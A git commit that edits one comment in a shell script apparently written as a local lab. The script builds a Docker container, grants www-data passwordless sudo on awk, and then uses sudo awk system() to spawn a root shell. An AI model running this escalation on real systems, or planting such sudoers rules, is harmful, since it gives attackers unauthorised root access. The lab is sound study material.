63ed7bf59e05b2c244c19fcadb59075bf586995a
FreeBSDKernel9-0 <coconutrepairs@gmail.com>
2026-08-29 16:24:16 +0100

    Fix a comment.

--- General Linux Stuff (BusyBox embedded junk)/Awk2Shell.sh
+++ General Linux Stuff (BusyBox embedded junk)/Awk2Shell.sh
@@ -3,7 +3,7 @@ docker run -d --name local_target php:8.2-apache
 docker exec -u root local_target sh -c 'apt-get update && apt-get install -y sudo && echo "www-data ALL=(ALL) NOPASSWD: /usr/bin/awk" >> /etc/sudoers'
 docker exec -it -u www-data local_target bash # Get uid=33 (www-data) with Docker, then get (root) in the next steps.
 
-# Get a (root) prompt by running sudo awk system() to launch /bin/bash. (THE EXTRA BRACKETS ARE REDUNTANT)
+# Get a (root) prompt by running sudo awk system() to launch /bin/bash.
 sudo awk 'BEGIN{system("/bin/bash")}'
 
 # Running id, and uname -a as (root) - you don't really need awk system(), as we got (root) earlier, but it's just funny.
